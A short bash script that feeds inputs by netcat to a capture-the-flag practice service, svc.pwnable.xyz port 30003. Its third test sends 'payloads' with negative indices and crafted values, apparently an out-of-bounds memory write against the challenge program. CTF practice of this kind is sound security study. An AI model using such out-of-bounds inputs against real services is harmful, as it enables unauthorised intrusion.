#!/bin/bash
echo "=== Test 1: Valid input ==="
(echo "1 2 3"; sleep 1) | timeout 5s nc svc.pwnable.xyz 30003

echo -e "\n=== Test 2: Multiple valid inputs ==="
(echo "1 2 3"; sleep 1; echo "1 2 3"; sleep 1; echo "0 0"; sleep 1) | timeout 5s nc svc.pwnable.xyz 30003

echo -e "\n=== Test 3: Our payloads ==="
(echo "-6 1 180"; sleep 1; echo "-5 1 184549375"; sleep 1; echo "0 0"; sleep 1) | timeout 5s nc svc.pwnable.xyz 30003